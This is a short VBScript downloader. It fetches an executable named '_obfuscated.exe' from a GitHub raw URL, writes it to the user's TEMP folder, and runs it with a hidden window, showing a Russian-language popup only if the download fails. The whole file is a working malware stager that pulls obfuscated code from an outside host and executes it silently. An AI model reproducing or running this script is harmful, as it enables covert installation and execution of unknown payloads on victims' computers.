Set WshShell = CreateObject("WScript.Shell")
Set XMLHttp = CreateObject("MSXML2.XMLHTTP")
Set FSO = CreateObject("Scripting.FileSystemObject")

url = "https://raw.githubusercontent.com/aitkadi584/test/main/_obfuscated.exe"
outputFile = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\_obfuscated.exe"

XMLHttp.Open "GET", url, False
XMLHttp.Send

If XMLHttp.Status = 200 Then
    Dim Stream
    Set Stream = CreateObject("ADODB.Stream")
    Stream.Open
    Stream.Type = 1
    Stream.Write XMLHttp.ResponseBody
    Stream.Position = 0
    Stream.SaveToFile outputFile, 2
    Stream.Close
    Set Stream = Nothing
    

    WshShell.Run outputFile, 0
Else
    WshShell.Popup "Ошибка скачивания файла.", 10, "Ошибка", 48
End If

Set XMLHttp = Nothing
Set FSO = Nothing
Set WshShell = Nothing
